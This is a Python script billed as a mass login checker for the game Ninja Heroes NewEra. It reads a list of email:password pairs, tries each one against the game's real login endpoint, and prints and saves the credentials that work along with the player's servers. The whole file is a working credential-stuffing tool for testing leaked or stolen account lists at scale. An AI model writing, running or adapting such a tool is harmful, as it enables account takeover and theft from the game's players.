import requests
import argparse
import urllib.parse
import json
import re
from colorama import Fore, Style, init

init(autoreset=True)

BANNER = f"""
{Fore.CYAN}
╔═════════════════════════════════════╗
║                                     ║
║ Ninja Heroes NewEra Account Checker ║
║       github.com/DarkSkull777       ║
║                                     ║
╚═════════════════════════════════════╝
"""

print(BANNER)

parser = argparse.ArgumentParser(description="Mass Login Checker")
parser.add_argument(
    "-l",
    "--list",
    required=True,
    help="File list email:password"
)

parser.add_argument(
    "-o",
    "--output",
    help="Save found results"
)

parser.add_argument(
    "--only",
    action="store_true",
    help="Only show found results (hide NOT AVAILABLE and ERROR)"
)

args = parser.parse_args()

found_results = []

headers = {
    "Accept": "*/*"
}


def extract_servers(text):
    try:
        data = json.loads(text)

        if "msg" in data:
            inner = json.loads(data["msg"])

            if "servers" in inner:
                return inner["servers"]

    except:
        pass

    match = re.search(
        r'"servers"\s*:\s*\[([^\]]+)\]',
        text
    )

    if match:
        servers_raw = match.group(1)
        servers = [x.strip() for x in servers_raw.split(",")]
        return servers

    return None


with open(args.list, "r", encoding="utf-8") as file:
    lines = file.readlines()

for line in lines:
    line = line.strip()

    if not line or ":" not in line:
        continue

    email, password = line.split(":", 1)

    encoded_email = urllib.parse.quote(email)

    url = (
        f"http://central.kageherostudio.com/game/lyto/login"
        f"?accId={encoded_email}"
        f"&pwd={password}"
        f"&channel=99108&lv=1"
    )

    try:
        response = requests.get(
            url,
            headers=headers,
            timeout=15
        )

        text = response.text

        if "servers" in text:
            servers = extract_servers(text)

            if servers:
                fixed_servers = sorted(
                    [int(x) + 1 for x in servers]
                )

                server_text = " , ".join(
                    map(str, fixed_servers)
                )

            else:
                server_text = "Unknown"

            result = (
                f"{email}:{password} "
                f"| server {server_text}"
            )

            print(
                f"{Fore.GREEN}[FOUND] -> {result}{Style.RESET_ALL}"
            )

            found_results.append(result)

        else:
            if not args.only:
                print(
                    f"{Fore.RED}[NOT AVAILABLE]{Style.RESET_ALL} "
                    f"{Fore.RED}{email}:{password}{Style.RESET_ALL}"
                )

    except Exception as e:
        if not args.only:
            print(
                f"{Fore.YELLOW}[ERROR]{Style.RESET_ALL} "
                f"{email}:{password} -> {e}"
            )

if args.output and found_results:
    with open(args.output, "w", encoding="utf-8") as out:
        for item in found_results:
            out.write(item + "\n")

    print(
        f"\n{Fore.CYAN}[SAVED]{Style.RESET_ALL} "
        f"Found results saved to {args.output}"
    )
